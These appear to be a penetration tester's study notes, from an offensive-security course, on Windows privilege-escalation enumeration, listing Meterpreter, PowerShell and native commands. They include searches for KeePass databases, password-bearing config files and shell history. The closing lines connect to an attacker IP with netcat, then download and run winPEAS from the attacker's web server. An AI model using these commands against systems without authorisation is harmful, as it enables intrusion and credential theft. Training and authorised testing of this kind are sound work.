
There are several key pieces of information we should always obtain:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```


**System**
`sysinfo`
meterpreter command, basic info

`hostname`
Windows command

`systeminfo`
native Windows command, more detailed than sysinfo

`wmic qfe get Caption,Description,HotFixID,InstalledOn`
get list of patches

`Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
show 32-bit applications

`Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
show 64-bit applications

**Users and Groups**

there are several built-in groups we should analyze, such as _Administrators_, _Backup Operators_, _Remote Desktop Users_, and _Remote Management Users_.

Members of _Backup Operators_ can backup and restore all files on a computer, even those files they don't have permissions for. We must not confuse this group with non-standard groups such as _BackupUsers_ in our example.

Members of _Remote Desktop Users_ can access the system with RDP, while members of _Remote Management Users_ can access it with _WinRM_.[5](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/enumerating-windows-47207/situational-awareness-45279#fn-local_id_52-5)

`getuid`
meterpreter command to get current user

`getprivs`
meterpreter command to show Windows privileges of user

`use post/windows/gather/enum_logged_on_users`
shows list of recently logged on users

`Get-LocalUser`
powershell cmdlet to show local users

`Get-LocalGroup`
powershell cmdlet to show local groups

`whoami`
Windows command to show current user

`whoami /priv`
Windows command to show current user and privs

`whoami /groups`
Windows command to show group memberships

`net users`
list of user accounts

`net user administrator`
info about admin

`net localgroup`
show groups

`net localgroup administrators`
show info about admin group

**Network Info**
`ipconfig`
info about network interfaces

`ipconfig /all`
more info about network interfaces

`route print`
list routes

`arp -a`
show arp table

`netstat -ano`
open ports on target

**Processes and Services**

`ps`
show process list in meterpreter

`pgrep <process>`
meterpreter command to find pid of process

`migrate <pid>`
migrate meterpreter to pid

`net start`
Windows command to list running services

`wmic service list brief`
more info about services

`tasklist /SVC`
enumerate list of running tasks and corresponding services for each task

`schtasks /query /fo LIST`
enumerate all scheduled tasks

`Get-Process`
powershell cmdlet to show running processes

Use Task Manager to view running process's folder

**Command Line**: Use the `tasklist` command with the `/v` option to view detailed information about running processes, including their working directories. For example:

```
tasklist /v | findstr "process_name"
```

Replace “process_name” with the actual name of the process you’re interested in. The working directory will be listed in the “CWD” column.

**Finding Goodies**
`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`
search for keepass db on C: drive

`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`
search the XAMPP folder for config files (could contain passwords or useful info)

`runas /user:backupadmin cmd`
with GUI access we can use runas to run things as another user

`Get-History`
show powershell command history

`(Get-PSReadlineOption).HistorySavePath`
get path of history file



**Automating Enumeration**
get meterpreter session on target and background it

`use post/windows/gather/win_privs`

`use post/windows/gather/enum_logged_on_users`

`use post/windows/gather/checkvm`

`use post/windows/gather/enum_applications`

`use post/windows/gather/enum_computers`

`use post/windows/gather/enum_patches`

get jaws from github, upload to target
```
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
```

in meterpreter, `download JAWS-Enum.txt`

**WinPeas**
`apt-get install peass`
`cp /usr/share/peass/winpeas/winPEASx64.exe .`
`python3 -m http.server 80`
install WinPEAS on kali, copy the binary to the home dir, then serve it up with python

```
nc 192.168.50.220 4444
powershell
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
./winPEAS.exe
```

connect, download winpeas, then run. review output (automated tool, so trust but verify)

